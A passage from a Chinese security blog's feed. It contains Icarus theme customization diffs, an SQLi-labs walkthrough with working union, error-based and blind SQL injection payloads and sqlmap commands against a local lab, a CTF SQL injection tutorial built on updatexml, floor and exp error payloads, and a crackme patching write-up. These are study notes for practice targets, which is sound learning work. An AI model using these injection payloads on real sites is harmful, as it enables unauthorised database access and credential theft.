title="优化个人信息布局"></a>优化个人信息布局</h3><p>减少头像大小，头像下方计数的地方增加链接，follow前增加icon。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff:layout&#x2F;widget&#x2F;profile.jsx</span><br><span class="line"></span><br><span class="line">-                    &lt;div class&#x3D;&quot;level-item has-text-centered is-marginless&quot;&gt;</span><br><span class="line">+                    &lt;a class&#x3D;&quot;level-item has-text-centered is-marginless&quot; href&#x3D;&#123;counter.category.url&#125;&gt;</span><br><span class="line">                         &lt;div&gt;</span><br><span class="line">                             &lt;p class&#x3D;&quot;heading&quot;&gt;&#123;counter.category.title&#125;&lt;&#x2F;p&gt;</span><br><span class="line">-                            &lt;a href&#x3D;&#123;counter.category.url&#125;&gt;</span><br><span class="line">+                            &lt;div&gt;</span><br><span class="line">                                 &lt;p class&#x3D;&quot;title&quot;&gt;&#123;counter.category.count&#125;&lt;&#x2F;p&gt;</span><br><span class="line">-                            &lt;&#x2F;a&gt;</span><br><span class="line">+                            &lt;&#x2F;div&gt;</span><br><span class="line">                         &lt;&#x2F;div&gt;</span><br><span class="line">-                    &lt;&#x2F;div&gt;</span><br><span class="line">+                    &lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h3 id="优化移动端显示"><a href="#优化移动端显示" class="headerlink" title="优化移动端显示"></a>优化移动端显示</h3><p>在移动端，隐藏 <code>archive</code> 和 <code>tags</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">+</span><br><span class="line">+    $(&#39;div.container div.card[data-type&#x3D;tags]&#39;).addClass(&#39;is-hidden-mobile&#39;);</span><br><span class="line">+    $(&#39;div.container div.card[data-type&#x3D;archives]&#39;).addClass(&#39;is-hidden-mobile&#39;);</span><br><span class="line"> &#125;(jQuery, window.moment, window.ClipboardJS, window.IcarusThemeSettings));</span><br></pre></td></tr></table></figure><h3 id="目录粘性定位"><a href="#目录粘性定位" class="headerlink" title="目录粘性定位"></a>目录粘性定位</h3><p>原来只支持侧边栏整体粘性定位，为了阅读体验，只针对目录开启粘性定位，增加 <code>column-left is-sticky</code> 类，并调整样式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;main.js</span><br><span class="line"></span><br><span class="line">     if ($toc.length &gt; 0) &#123;</span><br><span class="line">+        $toc.addClass(&#39;column-left is-sticky&#39;);</span><br><span class="line">         const $mask &#x3D; $(&#39;&lt;div&gt;&#39;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;article.styl</span><br><span class="line">+#toc</span><br><span class="line">+    max-height: calc(100vh - 22px)</span><br><span class="line">+    overflow-y: scroll</span><br></pre></td></tr></table></figure><h2 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h2><h3 id="增加许可协议"><a href="#增加许可协议" class="headerlink" title="增加许可协议"></a>增加许可协议</h3><p>新版已经支持许可协议，直接配置即可，参考<a href="https://blog.zhangruipeng.me/hexo-theme-icarus/Configuration/icarus用户指南-主题配置/#文章许可协议">官方文档</a>。</p><h3 id="增加标题自动计数"><a href="#增加标题自动计数" class="headerlink" title="增加标题自动计数"></a>增加标题自动计数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;article.styl</span><br><span class="line"></span><br><span class="line">+.article &#123;counter-reset:section&#125;</span><br><span class="line">+.article h2&#123;counter-reset:sub-section&#125;</span><br><span class="line">+.article h3&#123;counter-reset:composite&#125;</span><br><span class="line">+.article h4&#123;counter-reset:detail&#125;</span><br><span class="line">+.article h2:before&#123;content:counter(section) &quot; &quot;;counter-increment:section&#125;</span><br><span class="line">+.article h3:before&#123;content:counter(section) &quot;.&quot; counter(sub-section) &quot; &quot;;counter-increment:sub-section&#125;</span><br><span class="line">+.article h4:before&#123;content:counter(section) &quot;.&quot; counter(sub-section) &quot;.&quot; counter(composite) &quot; &quot;;counter-increment:composite&#125;</span><br></pre></td></tr></table></figure><h3 id="默认显示目录"><a href="#默认显示目录" class="headerlink" title="默认显示目录"></a>默认显示目录</h3><p>新版支持直接配置，在<code>_config.yml</code>增加<code>toc: true</code>即可。</p><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="card-增加浮动效果"><a href="#card-增加浮动效果" class="headerlink" title="card 增加浮动效果"></a>card 增加浮动效果</h3><p><code>:hover</code> 时增大阴影，并增加动画属性 <code>ease-in-out</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">diff:include&#x2F;style&#x2F;card.styl</span><br><span class="line"></span><br><span class="line"> .card</span><br><span class="line">     overflow: visible</span><br><span class="line">     border-radius: $card-radius</span><br><span class="line">+    &amp;:hover</span><br><span class="line">+        box-shadow: 0 6px 15px rgba(0,0,0,0.15), 0 0 1px rgba(0,0,0,0.1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;animation.js</span><br><span class="line"></span><br><span class="line">     setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">         $(&#39;body &gt; .navbar, body &gt; .section, body &gt; .footer&#39;).forEach(element &#x3D;&gt; &#123;</span><br><span class="line">             element.style.opacity &#x3D; &#39;1&#39;;</span><br><span class="line">-            element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out&#39;;</span><br><span class="line">+            element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out&#39;;</span><br><span class="line">         &#125;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">diff:source&#x2F;js&#x2F;animation.js</span><br><span class="line"></span><br><span class="line">                     element.style.transform &#x3D; &#39;&#39;;</span><br><span class="line">-                    element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out&#39;;</span><br><span class="line">+                    element.style.transition &#x3D; &#39;opacity 0.3s ease-out, transform 0.3s ease-out, box-shadow 0.3s ease-in-out&#39;;</span><br><span class="line">                 &#125;, i * 100);</span><br></pre></td></tr></table></figure><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><p><code>2020-12-04</code> 基于 <a href="https://github.com/ppoffice/hexo-theme-icarus/releases/tag/4.1.1">4.1.1</a> 版本重新改动。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里只列举了部分改动，详细的差异可以查看 <a href="https://github.com/ppoffice/hexo-theme-icarus/compare/4.1.1...AlphaLxy:master">diff</a>。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.alphalxy.com/2019/03/customize-icarus/">https://www.alphalxy.com/2019/03/customize-icarus/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文是基于icarus 4.x的版本&lt;/p&gt;
&lt;p&gt;本博客所选取的主题是 &lt;a href=&quot;https://github.com/AlphaLxy/hexo-theme-icarus&quot;&gt;Icarus&lt;/a&gt; ，并做了一些个性化的修改，很多修改都可以直观的看到。详细的差异可以
      
    
    </summary>
    
    
      <category term="环境配置" scheme="http://www.ol4three.com/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="icarus" scheme="http://www.ol4three.com/tags/icarus/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场学习记录</title>
    <link href="http://www.ol4three.com/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.ol4three.com/2020/12/23/WEB/SQLI-labs-%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-12-23T02:15:15.000Z</published>
    <updated>2020-12-25T08:35:11.341Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础挑战1-20关"><a href="#基础挑战1-20关" class="headerlink" title="基础挑战1-20关"></a>基础挑战1-20关</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 3%23    &#x2F;&#x2F;得到列数为3</span><br><span class="line">-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata%23  &#x2F;&#x2F;得到数据库名</span><br><span class="line">-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D; &#39;security&#39;%23 &#x2F;&#x2F;得到表名</span><br><span class="line">-1&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D; &#39;users&#39;%23 &#x2F;&#x2F;得到列名</span><br><span class="line">-1&#39; union select 1,username,password from users where id&#x3D;3%23 &#x2F;&#x2F;爆破得到数据</span><br></pre></td></tr></table></figure><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h4 id="报错注入1"><a href="#报错注入1" class="headerlink" title="报错注入1"></a>报错注入1</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--+</span><br></pre></td></tr></table></figure><h4 id="报错注入2"><a href="#报错注入2" class="headerlink" title="报错注入2"></a>报错注入2</h4><p>手动修改 <code>LIMIT+0,1</code> 来进行结果偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+AND(SELECT+1+FROM(SELECT+count(*),CONCAT((SELECT+(SELECT+(SELECT+CONCAT(0x7e,0x27,cast(username+AS+CHAR),0x27,0x7e)+FROM+users+LIMIT+0,1))+FROM+INFORMATION_SCHEMA.TABLES+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+1&#x3D;1--+</span><br></pre></td></tr></table></figure><p>布尔盲注</p><p>数据库第一个字母为 <code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;r&#39;--+</span><br><span class="line">?id&#x3D;1&#39; and left(database(),1)&gt;&#39;s&#39;--+</span><br></pre></td></tr></table></figure><p>延时盲注</p><p>数据库第一个字母的 ascii 码为 115，即<code>s</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;114,1,sleep(5))--+</span><br><span class="line">?id&#x3D;1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p><strong>联合查询注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=U -v 3</span><br></pre></td></tr></table></figure><p><strong>报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=E -v 3</span><br></pre></td></tr></table></figure><p><strong>布尔盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=B -v 3</span><br></pre></td></tr></table></figure><p><strong>延时盲注</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:80/Less-1/?id=1&quot;</span> --dbms=MySQL --random-agent --flush-session --technique=T -v 3</span><br></pre></td></tr></table></figure><h3 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h3><p>在添加’后返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>可以得到这个sql语句其实并没有单引号，只是用数字进行查询，查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>和less1一样 payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h3 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h3><p>添加’后返回</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;-1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>所以我们需要闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1%27)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h3 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h3><p>添加’后为报错添加”后报错如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;-1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure><p>sql语句为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&quot;) or 1&#x3D;1%23</span><br><span class="line">?id&#x3D;-1&quot;)+UNION+SELECT+1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><p>更新中…</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111">https://www.sqlsec.com/2020/05/sqlilabs.html#toc-heading-111</a></p><p><a href="http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/">http://blog.zeddyu.info/2019/03/03/Sqli-lab%E9%80%9F%E5%88%B7%E8%AE%B0%E5%BD%95(1-53)/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基础挑战1-20关&quot;&gt;&lt;a href=&quot;#基础挑战1-20关&quot; class=&quot;headerlink&quot; title=&quot;基础挑战1-20关&quot;&gt;&lt;/a&gt;基础挑战1-20关&lt;/h2&gt;&lt;h3 id=&quot;less-1&quot;&gt;&lt;a href=&quot;#less-1&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="SQLI-labs" scheme="http://www.ol4three.com/tags/SQLI-labs/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入-CTF</title>
    <link href="http://www.ol4three.com/2020/12/22/CTF/Web/SQL%E6%B3%A8%E5%85%A5-CTF/"/>
    <id>http://www.ol4three.com/2020/12/22/CTF/Web/SQL%E6%B3%A8%E5%85%A5-CTF/</id>
    <published>2020-12-22T14:38:25.000Z</published>
    <updated>2020-12-25T17:49:55.746Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><blockquote><p>SQL注入：开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如Cookies，UserAgent等）与SQL语句进行拼接，造成待执行的SQL语句可控，从而使我们可以执行任意SQL语句</p></blockquote><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="1-可回显的注入"><a href="#1-可回显的注入" class="headerlink" title="1.可回显的注入"></a>1.可回显的注入</h3><ul><li>可以联合查询的注入</li><li>报错注入</li><li>通过注入进行DNS请求，从而到达可回显的目的</li></ul><h3 id="2-不可回显的注入"><a href="#2-不可回显的注入" class="headerlink" title="2.不可回显的注入"></a>2.不可回显的注入</h3><ul><li>Bool盲注</li><li>时间盲注</li></ul><h3 id="3-二次注入"><a href="#3-二次注入" class="headerlink" title="3.二次注入"></a>3.二次注入</h3><p>通常作为一种业务逻辑较为复杂的题目出现，一般需要自己编写脚本以实现自动化注入。</p><p>在一般的CTF比赛中，出题人都会变相地增加一层WAF</p><h2 id="可以联合查询的SQL注入"><a href="#可以联合查询的SQL注入" class="headerlink" title="可以联合查询的SQL注入"></a>可以联合查询的SQL注入</h2><p>在可以联合查询的题目中，一般会将数据库查询的数据回显到页面中，比如下面这个例子(测试样例代码时需要关闭GPC)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">  $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$getid = <span class="string">&quot;SELECT Id FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span></span><br><span class="line">$result = mysql_query($getid) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="string">&#x27;&lt;/pre&#x27;</span>)</span><br><span class="line">$num = mysql_numrows($result);</span><br></pre></td></tr></table></figure><p>$id变量会将GET获取到的参数直接拼接到SQL语句中，假如传入如下参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39;union+select+1--+</span><br></pre></td></tr></table></figure><p>拼接后SQL语句就变成了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT Id FROM users WHERE user_id&#x3D;&#39;-1&#39;union select 1 --&#39;&#39;</span><br></pre></td></tr></table></figure><p>闭合前面的单引号，注释后面的单引号，中间写上需要的Payload就可以了</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml"></a>1.updatexml</h3><blockquote><p>updatexml 的报错原理从本质上来说就是函数的报错</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT updatexml(1,concat(0x01,(SELECT version()),0x01),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#39;~5.5.44-0ubuntu0.14.04.1~&#39;</span><br></pre></td></tr></table></figure><p>这里还是使用前面的例子，举出一个爆破数据库版本的样例Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1+updatexml(1,concat(0x01,SELECT version(),0x01),1)%23</span><br></pre></td></tr></table></figure><p>其他功能的Payload可以参照下面floor的使用方法来修改</p><h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor"></a>2.floor</h3><blockquote><p>floor报错的原理是rand和order by 或 group by的冲突。在MySQL文档中的原文如下：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RAND() in a WHERE clause is re-evaluated every time the WHERE is executed</span><br><span class="line">Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result. </span><br></pre></td></tr></table></figure><p>了解原理之后，我们来说一下应用的方法，如下。</p><p>爆破数据库版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1‘+and(select 1 from(select count(*),concat(select (select (select concat(0x01,user(),0x01)) from information_schema.table limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>爆破当前用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>爆破当前使用的数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>爆破指定表的字段（下面以表名为emails举例说明）:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_name &#x3D; 0x656d61696c73 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br></pre></td></tr></table></figure><p>ps:我们这里采用的是十六进制的编码后的表名。如果想采用十六进制编码的表名则需要添加引号，但是这里有时候会出现单引号导致的报错</p><p>以上的Payload 可以在sqli-labs的level1中复现</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226013914953.png" alt="image-20201226013914953"></p><p>这里只演示爆破当前用户</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><blockquote><p>exp函数报错，exq()报错的本质原因是溢出报错。我们可以在MySQL中输入</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select exp(~(select * from (select user())x))</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226014658415.png" alt="image-20201226014658415"></p><p>同样使用前面的例子，Payload为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; exp(~(select * from (select user())x))%23</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201226014605414.png" alt="image-20201226014605414"></p><h2 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h2><blockquote><p>Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如返回真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;SQL注入：开发人员在开发过程中，直接将URL中的参数、HTTP Body中的Post参数或其他外来的用户输入（如
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://www.ol4three.com/categories/CTF/"/>
    
    
      <category term="SQL注入" scheme="http://www.ol4three.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>crackme-系列之-crackme2</title>
    <link href="http://www.ol4three.com/2020/12/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme2/"/>
    <id>http://www.ol4three.com/2020/12/22/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme2/</id>
    <published>2020-12-22T06:36:22.000Z</published>
    <updated>2020-12-23T08:45:21.261Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先打开进行查看"><a href="#首先打开进行查看" class="headerlink" title="首先打开进行查看"></a>首先打开进行查看</h2><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32415.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32418.png" alt></p><p>拖入od 中进行查看 定位关键语句 发现关键跳 跟踪将</p><p>走到je的时候发现跳转已实现 那么我们可以先双击寄存器窗口的Z右边的1 改为0 此时会变成跳转未实现 线条也由红变白由此可知je 为关键跳进行 nop 操作即可成功暴破</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32421.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32424.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32426.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32436.png" alt></p><p>多选中几行，右键复制到可执行文件 所有修改 接着全部复制</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32443.png" alt></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32445.png" alt></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p><a href="https://www.52pojie.cn/thread-264394-1-1.html">https://www.52pojie.cn/thread-264394-1-1.html</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/32451.png" 